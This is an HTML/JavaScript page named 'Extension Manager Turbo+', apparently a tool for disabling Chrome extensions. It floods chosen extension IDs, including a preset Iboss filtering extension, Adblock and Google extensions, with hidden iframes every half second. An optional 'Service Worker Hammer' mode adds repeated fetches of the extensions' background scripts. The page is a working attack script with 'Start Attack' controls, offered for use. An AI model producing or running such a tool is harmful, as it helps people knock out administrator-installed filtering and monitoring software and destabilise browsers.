<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Extension Manager Turbo+</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 20px;
      overflow-x: hidden;
    }
    h1 {
      text-align: center;
      color: #00ff88;
      margin-bottom: 20px;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      background: #111;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #0f0;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
      color: #0f0;
    }
    select, input, textarea, button {
      width: 100%;
      margin-top: 10px;
      padding: 10px;
      background: #222;
      color: #0f0;
      border: 1px solid #0f0;
      border-radius: 5px;
      font-size: 16px;
    }
    select {
      max-height: 200px;
      overflow-y: scroll;
    }
    button {
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover {
      background: #00ff88;
      color: #000;
    }
    .flex-row {
      display: flex;
      gap: 10px;
      margin-top: 10px;
    }
    .flex-row button {
      flex: 1;
    }
    .status {
      margin-top: 20px;
      text-align: center;
      font-weight: bold;
      color: #00ff88;
    }
  </style>
</head>

<body>

  <h1>Extension Manager Turbo+</h1>

  <div class="container">
    <label for="extensionSelect">Select Extensions to Target:</label>
    <select id="extensionSelect" multiple></select>

    <label for="manualExtensions">Paste Extension IDs (one per line):</label>
    <textarea id="manualExtensions" placeholder="e.g. aaaaaaaabbbbbbbcccccccddeeefff"></textarea>

    <div class="flex-row">
      <button onclick="addManualExtensions()">Add Extensions</button>
      <button onclick="clearManualExtensions()">Clear All Pasted</button>
    </div>

    <label>
      <input type="checkbox" id="turboMode"> Enable Turbo+ Mode (Service Worker Hammer)
    </label>

    <div class="flex-row">
      <button onclick="startAttack()">Start Attack</button>
      <button onclick="stopAttack()">Stop Attack</button>
    </div>

    <div class="status" id="status">Status: Ready</div>
  </div>

  <script>
    let attackRunning = false;
    let intervalId;
    const defaultExtensions = [
      "gighmmpiobklfepjocnamgkkbiglidom", // Adblock Plus (example)
      "ekhagklcjbdpajgpjgmbionohlpdbjgc", // Iboss Extension (example)
      "cfhdojbkjhnklbpkdaibdccddilifddb", // Adblock Edge
      "alelhddbbhepgpmgidjdcjakblofbmce", // Google Docs Offline
      "pjkljhegncpnkpknbcohdijeoejaedia", // Gmail
      "aapocclcgogkmnckokdopfmhonfmgoek", // Google Drive
      "mhjfbmdgcfjbbpaeojofohoefgiehjai", // Chrome PDF Viewer
      "nmmhkkegccagdldgiimedpiccmgmieda", // Chrome Media Router
      // Add more common ones if needed
    ];

    function populateDefaultExtensions() {
      const select = document.getElementById('extensionSelect');
      defaultExtensions.forEach(id => {
        const option = document.createElement('option');
        option.value = id;
        option.textContent = id;
        select.appendChild(option);
      });
    }

    function addManualExtensions() {
      const textarea = document.getElementById('manualExtensions');
      const extensions = textarea.value.split('\n').map(ext => ext.trim()).filter(ext => ext.length > 0);
      const select = document.getElementById('extensionSelect');
      extensions.forEach(id => {
        const option = document.createElement('option');
        option.value = id;
        option.textContent = id;
        select.appendChild(option);
      });
      textarea.value = "";
    }

    function clearManualExtensions() {
      const select = document.getElementById('extensionSelect');
      select.innerHTML = '';
      populateDefaultExtensions();
    }

    function startAttack() {
      if (attackRunning) return;
      attackRunning = true;
      document.getElementById('status').innerText = "Status: Running...";

      const selected = Array.from(document.getElementById('extensionSelect').selectedOptions).map(opt => opt.value);
      const turbo = document.getElementById('turboMode').checked;

      intervalId = setInterval(() => {
        selected.forEach(id => {
          try {
            // Normal iframe method
            const iframe = document.createElement('iframe');
            iframe.style.width = "0";
            iframe.style.height = "0";
            iframe.style.border = "none";
            iframe.src = `chrome-extension://${id}/`;
            document.body.appendChild(iframe);

            if (turbo) {
              // Turbo mode tries to trigger service workers (extra load)
              fetch(`chrome-extension://${id}/background.js`).catch(() => {});
              fetch(`chrome-extension://${id}/service-worker.js`).catch(() => {});
            }
          } catch (e) {
            console.error('Error attacking extension:', id, e);
          }
        });
      }, 500); // Every 500ms
    }

    function stopAttack() {
      if (!attackRunning) return;
      clearInterval(intervalId);
      attackRunning = false;
      document.getElementById('status').innerText = "Status: Stopped";
    }

    window.onload = populateDefaultExtensions;
  </script>

</body>
</html>
